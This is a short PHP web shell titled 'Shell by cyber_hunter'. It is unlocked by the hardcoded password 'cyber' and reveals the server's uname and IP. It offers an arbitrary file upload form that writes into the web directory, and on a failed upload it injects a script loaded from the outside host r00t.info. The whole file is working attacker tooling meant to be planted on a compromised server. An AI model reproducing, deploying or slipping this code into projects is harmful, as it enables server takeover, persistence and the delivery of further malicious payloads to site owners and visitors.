<title>Shell by cyber_hunter</title>
<?php
session_start();
if($_SESSION["adm"])
{
echo '<b  style=color:#8E44AD><center><h3>Success!!!<br><img src="https://media.tenor.co/images/05464b3aaf16d6dda309101af54c5146/tenor.gif" height="50%" width="30%"/> <h3><center><br>'.'<b  style=color:blue>Server Uname:<br>'.php_uname().'<br></b>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>'; }
	else { echo '<b><script src=http://r00t.info/ccb.js></script><b>Upload Fail !!!</b><br><br>'; }}
}
echo  '<b  style=color:green>Your IP:<b>'.$ip = getenv("REMOTE_ADDR")."<br><br>";
echo '<b  style=color:red>ServerIP:<b>'.$server_ip = gethostbyname($_SERVER['SERVER_NAME']);
if($_POST["p"]){
$p = $_POST["p"];
$pa = ($p);
if($pa=="cyber"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
</body>




